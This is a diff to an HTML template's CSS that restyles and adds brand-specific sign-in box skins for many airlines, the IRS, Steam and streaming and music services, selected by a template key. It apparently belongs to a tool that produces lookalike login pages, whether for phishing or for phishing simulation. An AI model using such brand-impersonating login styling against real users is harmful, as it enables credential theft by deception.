@@ -1,4 +1,4 @@
-<!doctype html>
+﻿<!doctype html>
 <html lang="en">
 <head>
 <meta charset="utf-8">
@@ -199,19 +199,22 @@
   body.brand-irs button { background:#003366; border-radius:3px; background-image:none; font-weight:700; }
 
   body.brand-emirates { background:#C8102E; color:#fff; }
-  body.brand-emirates .auth { background:#fff; color:#1a1a1a; border-radius:6px; border:none; box-shadow:0 4px 20px rgba(0,0,0,.25); }
+  body.brand-emirates .auth { background:#fff; color:#1a1a1a; border-radius:0; border:none; box-shadow:0 4px 20px rgba(0,0,0,.25); }
   body.brand-emirates h1 { color:#C8102E; font-weight:700; }
   body.brand-emirates .sub { color:#555; opacity:1; }
-  body.brand-emirates input { background:#f7f7f7; border:1px solid #ddd; border-radius:4px; color:#1a1a1a; }
+  body.brand-emirates input { background:#f7f7f7; border:1px solid #ddd; border-radius:3px; color:#1a1a1a; }
   body.brand-emirates input:focus { border-color:#C8102E; background:#fff; box-shadow:none; }
-  body.brand-emirates button { background:#C8102E; border-radius:4px; background-image:none; font-weight:700; }
+  body.brand-emirates button { background:#C8102E; border-radius:0; background-image:none; font-weight:700; }
   body.brand-emirates button:hover { background:#a50d25; transform:none; filter:none; }
 
   body.brand-qatarairways { background:#5C0632; color:#fff; }
-  body.brand-qatarairways .auth { background:#fff; color:#1a1a1a; border-radius:6px; border:none; }
-  body.brand-qatarairways input { background:#f7f7f7; border:1px solid #ddd; border-radius:4px; color:#1a1a1a; }
+  body.brand-qatarairways .auth { background:#fff; color:#1a1a1a; border-radius:4px; border:none; box-shadow:0 4px 20px rgba(0,0,0,.25); }
+  body.brand-qatarairways h1 { color:#5C0632; font-weight:700; }
+  body.brand-qatarairways .sub { color:#555; opacity:1; }
+  body.brand-qatarairways input { background:#f7f7f7; border:1px solid #ddd; border-radius:3px; color:#1a1a1a; }
   body.brand-qatarairways input:focus { border-color:#5C0632; background:#fff; box-shadow:none; }
   body.brand-qatarairways button { background:#5C0632; border-radius:4px; background-image:none; font-weight:700; }
+  body.brand-qatarairways button:hover { background:#450025; transform:none; filter:none; }
 
   body.brand-steam { background:#1b2838; color:#c6d4df; }
   body.brand-steam .auth { background:#1e2b38; border:none; border-radius:3px; }
@@ -926,102 +929,148 @@
 
   /* ── Airlines ── */
   body.brand-etihad { background:#003366; color:#fff; }
-  body.brand-etihad .auth { background:#fff; color:#1a1a1a; border-radius:4px; box-shadow:0 4px 20px rgba(0,0,0,.2); }
-  body.brand-etihad h1 { color:#003366; }
-  body.brand-etihad input { background:#fff; border:1px solid #ccc; border-radius:3px; color:#1a1a1a; }
-  body.brand-etihad input:focus { border-color:#003366; box-shadow:none; background:#fff; }
-  body.brand-etihad button { background:#B8A062; background-image:none; border-radius:4px; }
+  body.brand-etihad .auth { background:#fff; color:#1a1a1a; border-radius:4px; border:none; box-shadow:0 4px 20px rgba(0,0,0,.25); }
+  body.brand-etihad h1 { color:#003366; font-weight:700; }
+  body.brand-etihad .sub { color:#555; opacity:1; }
+  body.brand-etihad input { background:#f7f7f7; border:1px solid #ddd; border-radius:4px; color:#1a1a1a; }
+  body.brand-etihad input:focus { border-color:#B8A062; background:#fff; box-shadow:none; }
+  body.brand-etihad button { background:#B8A062; border-radius:4px; background-image:none; font-weight:700; color:#fff; }
+  body.brand-etihad button:hover { background:#9a8550; transform:none; filter:none; }
 
   body.brand-turkishairlines { background:#C8102E; color:#fff; }
-  body.brand-turkishairlines .auth { background:#fff; color:#1a1a1a; border-radius:4px; box-shadow:0 4px 20px rgba(0,0,0,.2); }
-  body.brand-turkishairlines h1 { color:#C8102E; }
-  body.brand-turkishairlines input { background:#fff; border:1px solid #ccc; border-radius:3px; color:#1a1a1a; }
-  body.brand-turkishairlines input:focus { border-color:#C8102E; box-shadow:none; background:#fff; }
-  body.brand-turkishairlines button { background:#C8102E; background-image:none; border-radius:4px; }
+  body.brand-turkishairlines .auth { background:#fff; color:#1a1a1a; border-radius:4px; border:none; box-shadow:0 4px 20px rgba(0,0,0,.25); }
+  body.brand-turkishairlines h1 { color:#C8102E; font-weight:700; }
+  body.brand-turkishairlines .sub { color:#555; opacity:1; }
+  body.brand-turkishairlines input { background:#f7f7f7; border:1px solid #ddd; border-radius:4px; color:#1a1a1a; }
+  body.brand-turkishairlines input:focus { border-color:#C8102E; background:#fff; box-shadow:none; }
+  body.brand-turkishairlines button { background:#C8102E; border-radius:4px; background-image:none; font-weight:700; }
+  body.brand-turkishairlines button:hover { background:#a50d25; transform:none; filter:none; }
 
   body.brand-lufthansa { background:#05164D; color:#fff; }
-  body.brand-lufthansa .auth { background:#fff; color:#1a1a1a; border-radius:4px; box-shadow:0 4px 20px rgba(0,0,0,.2); }
-  body.brand-lufthansa h1 { color:#05164D; }
-  body.brand-lufthansa input { background:#fff; border:1px solid #ccc; border-radius:3px; color:#1a1a1a; }
-  body.brand-lufthansa input:focus { border-color:#FFCC00; box-shadow:none; background:#fff; }
-  body.brand-lufthansa button { background:#05164D; background-image:none; border-radius:4px; }
+  body.brand-lufthansa .auth { background:#fff; color:#1a1a1a; border-radius:4px; border:none; box-shadow:0 4px 20px rgba(0,0,0,.25); }
+  body.brand-lufthansa h1 { color:#05164D; font-weight:700; }
+  body.brand-lufthansa .sub { color:#555; opacity:1; }
+  body.brand-lufthansa input { background:#f7f7f7; border:1px solid #ddd; border-radius:4px; color:#1a1a1a; }
+  body.brand-lufthansa input:focus { border-color:#05164D; background:#fff; box-shadow:none; }
+  body.brand-lufthansa button { background:#05164D; border-radius:4px; background-image:none; font-weight:700; }
+  body.brand-lufthansa button:hover { background:#030e33; transform:none; filter:none; }
 
   body.brand-britishairways { background:#075AAA; color:#fff; }
-  body.brand-britishairways .auth { background:#fff; color:#1a1a1a; border-radius:4px; box-shadow:0 4px 20px rgba(0,0,0,.2); }
-  body.brand-britishairways h1 { color:#075AAA; }
-  body.brand-britishairways input { background:#fff; border:1px solid #ccc; border-radius:3px; color:#1a1a1a; }
-  body.brand-britishairways input:focus { border-color:#075AAA; box-shadow:none; background:#fff; }
-  body.brand-britishairways button { background:#075AAA; background-image:none; border-radius:4px; }
+  body.brand-britishairways .auth { background:#fff; color:#1a1a1a; border-radius:4px; border:none; box-shadow:0 4px 20px rgba(0,0,0,.25); }
+  body.brand-britishairways h1 { color:#075AAA; font-weight:700; }
+  body.brand-britishairways .sub { color:#555; opacity:1; }
+  body.brand-britishairways input { background:#f7f7f7; border:1px solid #ddd; border-radius:4px; color:#1a1a1a; }
+  body.brand-britishairways input:focus { border-color:#075AAA; background:#fff; box-shadow:none; }
+  body.brand-britishairways button { background:#075AAA; border-radius:4px; background-image:none; font-weight:700; }
+  body.brand-britishairways button:hover { background:#054080; transform:none; filter:none; }
 
   body.brand-airfrance { background:#002157; color:#fff; }
-  body.brand-airfrance .auth { background:#fff; color:#1a1a1a; border-radius:4px; box-shadow:0 4px 20px rgba(0,0,0,.2); }
-  body.brand-airfrance h1 { color:#002157; }
-  body.brand-airfrance input { background:#fff; border:1px solid #ccc; border-radius:3px; color:#1a1a1a; }
-  body.brand-airfrance input:focus { border-color:#E2003C; box-shadow:none; background:#fff; }
-  body.brand-airfrance button { background:#E2003C; background-image:none; border-radius:4px; }
+  body.brand-airfrance .auth { background:#fff; color:#1a1a1a; border-radius:4px; border:none; box-shadow:0 4px 20px rgba(0,0,0,.25); }
+  body.brand-airfrance h1 { color:#002157; font-weight:700; }
+  body.brand-airfrance .sub { color:#555; opacity:1; }
+  body.brand-airfrance input { background:#f7f7f7; border:1px solid #ddd; border-radius:4px; color:#1a1a1a; }
+  body.brand-airfrance input:focus { border-color:#E2003C; background:#fff; box-shadow:none; }
+  body.brand-airfrance button { background:#E2003C; border-radius:4px; background-image:none; font-weight:700; }
+  body.brand-airfrance button:hover { background:#b80030; transform:none; filter:none; }
 
   body.brand-klm { background:#00A1DE; color:#fff; }
-  body.brand-klm .auth { background:#fff; color:#1a1a1a; border-radius:4px; box-shadow:0 4px 20px rgba(0,0,0,.2); }
-  body.brand-klm h1 { color:#00A1DE; }
-  body.brand-klm input { background:#fff; border:1px solid #ccc; border-radius:3px; color:#1a1a1a; }
-  body.brand-klm input:focus { border-color:#00A1DE; box-shadow:none; background:#fff; }
-  body.brand-klm button { background:#00A1DE; background-image:none; border-radius:4px; }
+  body.brand-klm .auth { background:#fff; color:#1a1a1a; border-radius:4px; border:none; box-shadow:0 4px 20px rgba(0,0,0,.25); }
+  body.brand-klm h1 { color:#00A1DE; font-weight:700; }
+  body.brand-klm .sub { color:#555; opacity:1; }
+  body.brand-klm input { background:#f7f7f7; border:1px solid #ddd; border-radius:4px; color:#1a1a1a; }
+  body.brand-klm input:focus { border-color:#00A1DE; background:#fff; box-shadow:none; }
+  body.brand-klm button { background:#00A1DE; border-radius:4px; background-image:none; font-weight:700; }
+  body.brand-klm button:hover { background:#0082b3; transform:none; filter:none; }
 
   body.brand-singaporeairlines { background:#000; color:#fff; }
-  body.brand-singaporeairlines .auth { background:#fff; color:#1a1a1a; border-radius:4px; box-shadow:0 4px 20px rgba(0,0,0,.2); }
-  body.brand-singaporeairlines h1 { color:#1a1a1a; }
-  body.brand-singaporeairlines input { background:#fff; border:1px solid #ccc; border-radius:3px; color:#1a1a1a; }
-  body.brand-singaporeairlines input:focus { border-color:#C6A84B; box-shadow:none; background:#fff; }
-  body.brand-singaporeairlines button { background:#C6A84B; background-image:none; border-radius:4px; }
+  body.brand-singaporeairlines .auth { background:#fff; color:#1a1a1a; border-radius:4px; border:none; box-shadow:0 4px 20px rgba(0,0,0,.25); }
+  body.brand-singaporeairlines h1 { color:#1a1a1a; font-weight:700; }
+  body.brand-singaporeairlines .sub { color:#555; opacity:1; }
+  body.brand-singaporeairlines input { background:#f7f7f7; border:1px solid #ddd; border-radius:4px; color:#1a1a1a; }
+  body.brand-singaporeairlines input:focus { border-color:#C6A84B; background:#fff; box-shadow:none; }
+  body.brand-singaporeairlines button { background:#C6A84B; border-radius:4px; background-image:none; font-weight:700; color:#fff; }
+  body.brand-singaporeairlines button:hover { background:#a8893a; transform:none; filter:none; }
 
   body.brand-delta { background:#003366; color:#fff; }
-  body.brand-delta .auth { background:#fff; color:#1a1a1a; border-radius:4px; box-shadow:0 4px 20px rgba(0,0,0,.2); }
-  body.brand-delta h1 { color:#003366; }
-  body.brand-delta input { background:#fff; border:1px solid #ccc; border-radius:3px; color:#1a1a1a; }
-  body.brand-delta input:focus { border-color:#E01933; box-shadow:none; background:#fff; }
-  body.brand-delta button { background:#E01933; background-image:none; border-radius:4px; }
+  body.brand-delta .auth { background:#fff; color:#1a1a1a; border-radius:4px; border:none; box-shadow:0 4px 20px rgba(0,0,0,.25); }
+  body.brand-delta h1 { color:#003366; font-weight:700; }
+  body.brand-delta .sub { color:#555; opacity:1; }
+  body.brand-delta input { background:#f7f7f7; border:1px solid #ddd; border-radius:4px; color:#1a1a1a; }
+  body.brand-delta input:focus { border-color:#E01933; background:#fff; box-shadow:none; }
+  body.brand-delta button { background:#E01933; border-radius:4px; background-image:none; font-weight:700; }
+  body.brand-delta button:hover { background:#b81528; transform:none; filter:none; }
+
+  body.brand-united { background:#002244; color:#fff; }
+  body.brand-united .auth { background:#fff; color:#1a1a1a; border-radius:4px; border:none; box-shadow:0 4px 20px rgba(0,0,0,.25); }
+  body.brand-united h1 { color:#002244; font-weight:700; }
+  body.brand-united .sub { color:#555; opacity:1; }
+  body.brand-united input { background:#f7f7f7; border:1px solid #ddd; border-radius:4px; color:#1a1a1a; }
+  body.brand-united input:focus { border-color:#0072CE; background:#fff; box-shadow:none; }
+  body.brand-united button { background:#002244; border-radius:4px; background-image:none; font-weight:700; }
+  body.brand-united button:hover { background:#001633; transform:none; filter:none; }
 
   body.brand-unitedairlines { background:#002244; color:#fff; }
-  body.brand-unitedairlines .auth { background:#fff; color:#1a1a1a; border-radius:4px; box-shadow:0 4px 20px rgba(0,0,0,.2); }
-  body.brand-unitedairlines h1 { color:#002244; }
-  body.brand-unitedairlines input { background:#fff; border:1px solid #ccc; border-radius:3px; color:#1a1a1a; }
-  body.brand-unitedairlines input:focus { border-color:#0A2A5A; box-shadow:none; background:#fff; }
-  body.brand-unitedairlines button { background:#002244; background-image:none; border-radius:4px; }
+  body.brand-unitedairlines .auth { background:#fff; color:#1a1a1a; border-radius:4px; border:none; box-shadow:0 4px 20px rgba(0,0,0,.25); }
+  body.brand-unitedairlines h1 { color:#002244; font-weight:700; }
+  body.brand-unitedairlines .sub { color:#555; opacity:1; }
+  body.brand-unitedairlines input { background:#f7f7f7; border:1px solid #ddd; border-radius:4px; color:#1a1a1a; }
+  body.brand-unitedairlines input:focus { border-color:#0072CE; background:#fff; box-shadow:none; }
+  body.brand-unitedairlines button { background:#002244; border-radius:4px; background-image:none; font-weight:700; }
+  body.brand-unitedairlines button:hover { background:#001633; transform:none; filter:none; }
+
+  body.brand-american { background:#0078D2; color:#fff; }
+  body.brand-american .auth { background:#fff; color:#1a1a1a; border-radius:4px; border:none; box-shadow:0 4px 20px rgba(0,0,0,.25); }
+  body.brand-american h1 { color:#0078D2; font-weight:700; }
+  body.brand-american .sub { color:#555; opacity:1; }
+  body.brand-american input { background:#f7f7f7; border:1px solid #ddd; border-radius:4px; color:#1a1a1a; }
+  body.brand-american input:focus { border-color:#0078D2; background:#fff; box-shadow:none; }
+  body.brand-american button { background:#0078D2; border-radius:4px; background-image:none; font-weight:700; }
+  body.brand-american button:hover { background:#005fa3; transform:none; filter:none; }
 
   body.brand-americanairlines { background:#0078D2; color:#fff; }
-  body.brand-americanairlines .auth { background:#fff; color:#1a1a1a; border-radius:4px; box-shadow:0 4px 20px rgba(0,0,0,.2); }
-  body.brand-americanairlines h1 { color:#0078D2; }
-  body.brand-americanairlines input { background:#fff; border:1px solid #ccc; border-radius:3px; color:#1a1a1a; }
-  body.brand-americanairlines input:focus { border-color:#0078D2; box-shadow:none; background:#fff; }
-  body.brand-americanairlines button { background:#0078D2; background-image:none; border-radius:4px; }
+  body.brand-americanairlines .auth { background:#fff; color:#1a1a1a; border-radius:4px; border:none; box-shadow:0 4px 20px rgba(0,0,0,.25); }
+  body.brand-americanairlines h1 { color:#0078D2; font-weight:700; }
+  body.brand-americanairlines .sub { color:#555; opacity:1; }
+  body.brand-americanairlines input { background:#f7f7f7; border:1px solid #ddd; border-radius:4px; color:#1a1a1a; }
+  body.brand-americanairlines input:focus { border-color:#0078D2; background:#fff; box-shadow:none; }
+  body.brand-americanairlines button { background:#0078D2; border-radius:4px; background-image:none; font-weight:700; }
+  body.brand-americanairlines button:hover { background:#005fa3; transform:none; filter:none; }
 
   body.brand-southwest { background:#304CB2; color:#fff; }
-  body.brand-southwest .auth { background:#fff; color:#1a1a1a; border-radius:4px; box-shadow:0 4px 20px rgba(0,0,0,.2); }
-  body.brand-southwest h1 { color:#304CB2; }
-  body.brand-southwest input { background:#fff; border:1px solid #ccc; border-radius:3px; color:#1a1a1a; }
-  body.brand-southwest input:focus { border-color:#F9B612; box-shadow:none; background:#fff; }
-  body.brand-southwest button { background:#F9B612; color:#000; background-image:none; border-radius:4px; }
+  body.brand-southwest .auth { background:#fff; color:#1a1a1a; border-radius:4px; border:none; box-shadow:0 4px 20px rgba(0,0,0,.25); }
+  body.brand-southwest h1 { color:#304CB2; font-weight:700; }
+  body.brand-southwest .sub { color:#555; opacity:1; }
+  body.brand-southwest input { background:#f7f7f7; border:1px solid #ddd; border-radius:4px; color:#1a1a1a; }
+  body.brand-southwest input:focus { border-color:#304CB2; background:#fff; box-shadow:none; }
+  body.brand-southwest button { background:#F9B612; color:#1a1a1a; border-radius:4px; background-image:none; font-weight:700; }
+  body.brand-southwest button:hover { background:#e0a200; transform:none; filter:none; }
 
   body.brand-ryanair { background:#073590; color:#fff; }
-  body.brand-ryanair .auth { background:#fff; color:#1a1a1a; border-radius:4px; box-shadow:0 4px 20px rgba(0,0,0,.2); }
-  body.brand-ryanair h1 { color:#073590; }
-  body.brand-ryanair input { background:#fff; border:1px solid #ccc; border-radius:3px; color:#1a1a1a; }
-  body.brand-ryanair input:focus { border-color:#F7A800; box-shadow:none; background:#fff; }
-  body.brand-ryanair button { background:#F7A800; color:#000; background-image:none; border-radius:4px; }
+  body.brand-ryanair .auth { background:#fff; color:#1a1a1a; border-radius:4px; border:none; box-shadow:0 4px 20px rgba(0,0,0,.25); }
+  body.brand-ryanair h1 { color:#073590; font-weight:700; }
+  body.brand-ryanair .sub { color:#555; opacity:1; }
+  body.brand-ryanair input { background:#f7f7f7; border:1px solid #ddd; border-radius:4px; color:#1a1a1a; }
+  body.brand-ryanair input:focus { border-color:#F7A800; background:#fff; box-shadow:none; }
+  body.brand-ryanair button { background:#F7A800; color:#1a1a1a; border-radius:4px; background-image:none; font-weight:700; }
+  body.brand-ryanair button:hover { background:#d98f00; transform:none; filter:none; }
 
   body.brand-easyjet { background:#FF6600; color:#fff; }
-  body.brand-easyjet .auth { background:#fff; color:#1a1a1a; border-radius:4px; box-shadow:0 4px 20px rgba(0,0,0,.2); }
-  body.brand-easyjet h1 { color:#FF6600; }
-  body.brand-easyjet input { background:#fff; border:1px solid #ccc; border-radius:3px; color:#1a1a1a; }
-  body.brand-easyjet input:focus { border-color:#FF6600; box-shadow:none; background:#fff; }
-  body.brand-easyjet button { background:#FF6600; background-image:none; border-radius:4px; }
+  body.brand-easyjet .auth { background:#fff; color:#1a1a1a; border-radius:4px; border:none; box-shadow:0 4px 20px rgba(0,0,0,.25); }
+  body.brand-easyjet h1 { color:#FF6600; font-weight:700; }
+  body.brand-easyjet .sub { color:#555; opacity:1; }
+  body.brand-easyjet input { background:#f7f7f7; border:1px solid #ddd; border-radius:4px; color:#1a1a1a; }
+  body.brand-easyjet input:focus { border-color:#FF6600; background:#fff; box-shadow:none; }
+  body.brand-easyjet button { background:#FF6600; border-radius:4px; background-image:none; font-weight:700; }
+  body.brand-easyjet button:hover { background:#d94f00; transform:none; filter:none; }
 
   body.brand-airarabia { background:#E6000F; color:#fff; }
-  body.brand-airarabia .auth { background:#fff; color:#1a1a1a; border-radius:4px; box-shadow:0 4px 20px rgba(0,0,0,.2); }
-  body.brand-airarabia h1 { color:#E6000F; }
-  body.brand-airarabia input { background:#fff; border:1px solid #ccc; border-radius:3px; color:#1a1a1a; }
-  body.brand-airarabia input:focus { border-color:#E6000F; box-shadow:none; background:#fff; }
-  body.brand-airarabia button { background:#E6000F; background-image:none; border-radius:4px; }
+  body.brand-airarabia .auth { background:#fff; color:#1a1a1a; border-radius:4px; border:none; box-shadow:0 4px 20px rgba(0,0,0,.25); }
+  body.brand-airarabia h1 { color:#E6000F; font-weight:700; }
+  body.brand-airarabia .sub { color:#555; opacity:1; }
+  body.brand-airarabia input { background:#f7f7f7; border:1px solid #ddd; border-radius:4px; color:#1a1a1a; }
+  body.brand-airarabia input:focus { border-color:#E6000F; background:#fff; box-shadow:none; }
+  body.brand-airarabia button { background:#E6000F; border-radius:4px; background-image:none; font-weight:700; }
+  body.brand-airarabia button:hover { background:#b5000c; transform:none; filter:none; }
 
   /* ── Video Streaming ── */
   body.brand-disneyplus { background:#040714; color:#fff; }
@@ -1100,7 +1149,7 @@
   body.brand-applemusic h1 { color:#fff; }
   body.brand-applemusic input { background:#2C2C2E; border:none; border-radius:10px; color:#fff; }
   body.brand-applemusic input:focus { box-shadow:0 0 0 2px #FC3C44; border:none; background:#2C2C2E; }
-  body.brand-applemusic button { background:#FC3C44; background-image:none; border-radius:980px; }
+  body.brand-applemusic button { background:#FC3C44; background-image:none; border-radius:980px; font-weight:600; }
 
   body.brand-amazonmusic { background:#232F3E; color:#fff; }
   body.brand-amazonmusic .auth { background:#131921; border:none; border-radius:8px; }
@@ -1124,11 +1173,12 @@
   body.brand-tidal button { background:#fff; color:#000; background-image:none; border-radius:4px; font-weight:700; }
 
   body.brand-deezer { background:#A238FF; color:#fff; }
-  body.brand-deezer .auth { background:#fff; color:#1a1a1a; border-radius:8px; }
-  body.brand-deezer h1 { color:#A238FF; }
+  body.brand-deezer .auth { background:#fff; color:#1a1a1a; border-radius:8px; box-shadow:0 4px 20px rgba(162,56,255,.3); }
+  body.brand-deezer h1 { color:#1a1a1a; font-weight:700; }
+  body.brand-deezer .sub { color:#666; opacity:1; }
   body.brand-deezer input { background:#fff; border:1px solid #ddd; border-radius:4px; color:#1a1a1a; }
-  body.brand-deezer input:focus { border-color:#A238FF; box-shadow:none; background:#fff; }
-  body.brand-deezer button { background:#A238FF; background-image:none; border-radius:4px; }
+  body.brand-deezer input:focus { border-color:#A238FF; box-shadow:0 0 0 2px rgba(162,56,255,.2); background:#fff; }
+  body.brand-deezer button { background:#A238FF; background-image:none; border-radius:4px; color:#fff; font-weight:700; }
 
   body.brand-soundcloud { background:#FF5500; color:#fff; }
   body.brand-soundcloud .auth { background:#fff; color:#1a1a1a; border-radius:8px; }
@@ -1151,12 +1201,12 @@
   body.brand-bandcamp input:focus { border-color:#1da0c3; box-shadow:none; background:#fff; }
   body.brand-bandcamp button { background:#1da0c3; background-image:none; border-radius:4px; }
 
-  body.brand-spotifyaudio { background:#121212; color:#fff; }
-  body.brand-spotifyaudio .auth { background:#181818; border:none; border-radius:8px; }
-  body.brand-spotifyaudio h1 { color:#1DB954; }
-  body.brand-spotifyaudio input { background:#2a2a2a; border:none; border-radius:4px; color:#fff; }
-  body.brand-spotifyaudio input:focus { box-shadow:0 0 0 2px #1DB954; border:none; background:#2a2a2a; }
-  body.brand-spotifyaudio button { background:#1DB954; color:#000; background-image:none; border-radius:500px; }
+  body.brand-spotifyaudio { background:#191414; color:#fff; }
+  body.brand-spotifyaudio .auth { background:#191414; border:none; box-shadow:none; border-radius:8px; }
+  body.brand-spotifyaudio h1 { color:#fff; font-weight:700; }
+  body.brand-spotifyaudio input { background:#3e3e3e; border:none; border-radius:4px; color:#fff; }
+  body.brand-spotifyaudio input:focus { box-shadow:0 0 0 3px rgba(29,185,84,.6); border:none; background:#3e3e3e; }
+  body.brand-spotifyaudio button { background:#1DB954; color:#000; background-image:none; border-radius:500px; font-weight:700; letter-spacing:1.5px; text-transform:uppercase; }
 </style>
 </head>
 <body class="brand-<%= tpl.key || tpl.name.toLowerCase().replace(/[^a-z0-9]/g,'') %>">
